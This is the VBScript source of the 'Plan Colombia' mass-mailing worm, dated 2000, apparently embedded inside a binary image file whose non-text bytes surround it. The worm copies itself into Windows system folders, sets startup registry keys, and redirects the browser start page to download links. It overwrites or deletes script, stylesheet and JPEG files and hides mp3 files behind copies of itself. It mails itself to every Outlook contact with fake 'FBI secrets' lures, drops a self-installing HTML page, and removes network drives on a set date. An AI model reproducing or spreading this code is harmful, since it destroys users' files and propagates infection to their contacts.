p|ı;<<<<ô;<<<<<;5;;5;C·€¼ş5ô<<<ô5ô<<<ô;5555ôô5(Ìµë¼ş5;ôô<<;ô<<<;;5ô<<ô5;"sì ¼ş5;;<<ô;;<<ô;;ôô<<ôô;öÙ°¼ş5;;ô<ô;5ôô;5ôôôôôô;" À¼ş;5;ôô<ô;5;;;Àü5;õõĞ¼ş;ôôô;ô!ôô!;5Ğ¼àüşõA K<<<<ô<!òğ¼şòGWàààÙúûàá  }ş*;İ;İyÀFüÑ|!=ş5*Ø|ŞàÜ× İØÜIG ıı;;õÿxt\ÙG|zwõò550ıı5;;ôô "AFAFFAAòô55@½ı5ôôô<55;55555;<ô;P½ı5ô;55ô5ô;5555;ôô;`}ı5<ô5;ô;5;;55p=ıô<ôô
p}5ô;€=ı;<ôôô€=ôô;5ıü5ôôô<;}ôôô5 ıü;ôô<<5 };ôô;°½üôô<!<°ış°=°½ô<ôÀ½ü5;ô<!ôÀ½ô<<;Ğ½ü;ôô<<Ğı<ôôà}ü;ôô<"Gàıôôôğ}üHûûGàöğ= ğıô<ô5 ~ü Şyyò  >"HÙH~ü Gøò>òsÜs ~ü ~ı >ôGJ50~ı0>@~ı@>P~ı5P>`~ı`>p>ı€şüşü: şü:ÿÿ  " 6 P;ÿ`ûş55pûş;;;;€ûş;ôô;»ş;ôô; »ş$O5;;5CQ°»şìSï555ğ%
À»şìğEES&Ğ{ş5õĞ·#5ô;à;ş)OÂºPò5ôô55ğ{ş55<<<<;;ôô5555 <ş;;ô<!<<<<<5;;¼ı;ô;;;<!<<<<<5ôô5 |ı;<<<ô<ôô<<<<<<5ôô50<ı;<<;ôô<<ô<<<<<<5;;;@üü;<!!<<KK!ôô<<<<<ô5;;O·ºPüüô<!<!<!KJ!<ô<<<<ô;55ô;(ğ`üü;<<ôô!<!KK!;<!<<;;;55<<;)PQpüü5ô<;5<KK!!!ô;<<<5;ô5;<<ôô;G€üü5;ô5ôKJ!!!ô5;<ôô5ô5ô<<ôô; ¼ü5ôôô;;<<!!<ô;;ô!;5;5ô<<;ô ¼ü;<<ô;5ôô<!Kôô;ô5;;55°¼üô!!<;5<ôô;!ôô<<;JK5À|ü;<<<;rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                     <ô!!!!<<ô<<ôô55;;àÿı5ô<ôô<<<<<<;<<ô;5;;;55ğ¿ıõô<ô<<<<<ôô;<<ôô;ô;ô 5 €ı ÙH"ôô<<<ôôô;<<<ôôArü5€ı!{ÒwöwsŞFòôô<<<<ô ^s{!; €ıIÜ!I!z±±"ûÙûrüÿÿûÑöÜ<JJ;0€ıİG!ÓzØJ{IKİİİŒù­Óz×<J! @ÀıòŞ{ÓÓÜİ!!KII|!IÜKzÒ PÀşõòõ" İÜØ<|Óİ<ö	`@ !ÓŞ {úòp@ÿÿ øÿ' 7 ıÿ ½ÿ5;;;0}ÿ³¡Pôô;@}ÿS–˜"ô<;P}ÿâ—ŸPã}ôP=`}ÿC¹—•³ñS55`=p}ÿğ¹––©¹ºQ55;ô55€}ÿğºµ¶·SBL;;;;<;;ô5}ÿ#ĞËC5<<<ô;;<ô;;<< ½ÿ&ò;5ô<!<ô<<<<Kô°}ÿï55;;<!<<<<<5ô<ô5À=ÿôôôôô;ô!<<<<<555;ôĞışô<!ôôôôô<<<<<<;55<ô;à½ş<!!ôôô<<ôô<<<<<ôô5ô;ô;;ğ½ş;<!!ôôô!K<<ô<!<<ô;5;ô<ô; ¾ş;<!!;ôô<K!!ôô<!<ô5;5;ô<ô5¾şôKJ!5ôô<!!!<;ô!<ô;5;;ôô5 >ü	QâÊì ~ş!JJ!;;<J!!!!;;<!ô5;;;50şûğ¨™tK0~şô!!<<55ô!!!<!ô;5ôô5;;<ô&@şû	Ïš§ÀÜJ<ô<!ô;;ôô<KKô;;;5<5&ò!Jô%Pşû	º¥§ĞúÓİØG5;!Kô55ôôô<!<;;!;<J5LøI$`şûCKİJİú;!!<;5ôôô;;ôôôKôô<ô&ÊPp>ıIJIøõôôô;p> ;;;ô<<<<ô "İòCË
€~ı;5555€~ 5;ô!!ôKŞsÙö"Qğ¾ş~ :;ôKİÙuüy{!J# ~ ^áıtwuxyIÓØÜH°~ ôK<±Œ!;{zØÙ^*ÀşÿİÓJÜİ;­ŒùwHòĞşÿø½ÀwÙ@XrH ô;;à¾ÿA@A*;5ôôô5ğ~ÿ5;;5KK<5;;;ô; ?ÿ5;<ôôKIô;55ô;;5ÿş;!K;KJJô;ô<;ô5 ¿ş5!JJ;5JJJI<ô!ô5ô50¿ş;KI!;J!KJ<JJ;ô5;@ş<K!55<KKKIKJô;ô5;Pş5!!;55<JKJİKôô;ô;`?ş;;5<K<55;<İ<JJJ5ô;ô;p?şô;5JJô55ô!İôJKKô;ô;€ÿı;ô;ôK!ô5<!İ<JK!;;ô;ÿıô;ô!<<55!<İ<KK<;;;;õ ÿı;ôK!!<;K!J!KK<ôôô;ö°¿ı55ô<!<ô5;!<J!K!5ô;;;55<À¿ı;;<!ô<ô55ô!<K!<ô;;;;5ôĞ¿ı;ô!<;ôô;5ô!!!!ôô5;;5;õ !à¿ıõ;<!<;ô;;;ô!!<<;55;;ô5 "ğıúXA!ô;ô;;;ô!!<ô55;;ôôò5< @ıK°utA*ô;5;ô!K!<;;;ôôô"" K@ıôØ{ÜKøÑFõ5;ô<!KKôôôô"^WrK! @ıIÜİKKİz‚Hò<<!II<ôòŞøs{!!<0@ıòúö<|×IÓI"Şsu÷À÷uyÜ;IİÜÜô:@€ıò××ØØÜ<KI{®°Ü|‰JKÜİöGP@ş øŞKÜ<!IØIØ!Ó;Ñİ `Àşõ"!|Ø!­°Ø ;õ
p€ÿöøö×Ş<ÿÿ øÿ! 7 ıÿ ½ÿ;;;0}ÿK{¼Gô;@}ÿ&œ•–T;;P}ÿM›– BU`}ÿ$¹‘œ¹Ìï5ôô<ô5p}ÿìĞÊ–—¦ËD;;;;€}ÿ$¹¦ñ§¹ËB55;;5555}ÿ Êººâ;ô<<<;55ô }ÿ5ğCò;5ô!<;5;5;5°½ÿ55;;5<<ô;;;À½ÿ;ôôô;;5ô<ôôô;Ğ}ÿ;ô<ôôôô;5<<ôôôà=ÿ5<<<;;;;;5ô<ôôô5ğ=ÿô!!!ô55ôô;;ô<ôô5 >ÿô<!!ô55ô<<<5ôôô5şşôô<<;;;;<<<55ôô5 ~ü%ËQC şşô<<<ô5;ô<<<ô;0~ü&¶Ùô0¾ş5<KK<ô;;ôô<<ô@~üÊµuØIKô<!<<;;;ôô<!<5P~üSSC_øÓİÓ"5ô!!ô;5ô<ôôô<55;5`~ü`~ı<İIú 5ô!!ô5;ô<ô;;ô;55p~ıJJGôô!<<;5;ôô;ô<<;ôö"
€¾ıõ5;;ô€~ 5;;ô<<!AHŞ<~ş~ 5;õòöHüsKİô ~ @HXtÀÒJÜØÜ"°> "ø!z±z;{|ıÀşÿözİ××òÿ¿r 5Ğ¾ÿò{½ur^A 5;;5à~ÿ55* òô;ôô;;5ğ>ÿ5ô;5;<JJ5;5<;5 ÿş5;ôôôô;5KJK;<ô;5¿ş55;!!J!55KK<ôôô;5 ¿ş555!<IIK5K<!KK;ô550ş5;K<İI!;IKKJ;ôô55@?ş555ôôKIJ!5<JJJJ5ôô55P?ş5;55<;<!!<5<JJ!J5;ô5`?ş;;55K;<ô;ô5!KK<K5;ô55pÿıô;55K5ô;5;5J!K<!;;;5€ÿı;<;;;K5;ô555JKI<<;;;55ÿıô<ôôK<5555!<J<!ô5ô ÿı<ôô!!55ô55!!K<<ô;°ÿı<;!!ôKKKô5<!J<<5;5À¿ı5ô;!ôIIJJJ<ô;<!K<ô5;5Ğ¿ı;;;<!KJIIJ!ô;<!K<ô5;5à¿ı;5ôô!ô!KKK!<<ô!!<;;55 ğ¿ıô;<<<ô<!<<<<<ô!!ô5;555 €ış <<;<<<<<ôôô<!<;55;*A"ò€ıõÑ½u^ÿ  <ôôôôôô<!!<;5ÙøK @ı<!°I±s|‚ÀàA òôô<!K!<AGÜK!:0@ıİØ×ôK<İÓ±®ÓøÑúÙ÷wÙwwŞ<<İõ@€ıÜÑø<Ó°{ÓÓ±Ü<IJÜØˆØİØKK  P€ı" "|°ØJØİJ!!ØÓ<ÜI"ò`Àşò"ö Iô{Ó<z{Ip€  ø""!ÿÿ	 øÿ 8  ı } 5 = 5;;;50ıÿSİ¬ªs5@ıÿ¥’–™SPıÿ%—–šSSCô<;`ıÿĞÂÂ›QM5;;;pıÿÏ···S;55€}şëË¸â€ıÿSºµÎĞBôô;;;}şÂ·¹·D*55OÊCï5;<<ô }ş¸·¹µºÙôõ#õôô55<;°}şìº¶ºı;ô555ô;À}şËĞÂÏOa5<<<;;;;ôĞ}ş:Ğ½ÿ55;<<;;5ô5à½ÿ455ô!<;5;5ğ½ÿ955ô!!<;5555; ¾ÿ5<!!<;5;;5¾ÿ5ô<!!;5ôô ¾ÿ;ô<KK;5;ô0¾ÿ1;KK<5;ô5@¾ÿ0<K!ô55;ô5P¾ÿô!K!ô5;5;`şı	CS%õ;!!!ô55ô5:pşı¨›š¨½ØGø";ô;5;ôò€şıDµ›——™š„±IÓs <;5òF"şı'¹™™§Ëu¯ÜIØ5òFWHö!5 şıSºËCG{I< Js±KIŞ°>şë°>ÿ55!ÜØ<ÙFÀşşKİJÙÙ^ ĞşşõAô;;5à¾ş555Jôôôôğ~ş;ô5;ôK5ô;ô ş;;ô<ô5ôK<;;ôô5?ş5<<IK<5ô!ôô;;ô ?ş5;K!I!ô<Kôô;;;0?ş555<ô!J<;JI<ô5;ô@?ş555!5<K!<5JI<ô;5ô5P?ş555<5ôô<<KJ<ô;5ô`?ş5;55<ô;;ô5K!;ôô5;5p?ş;ô55<;;;;rem  ==============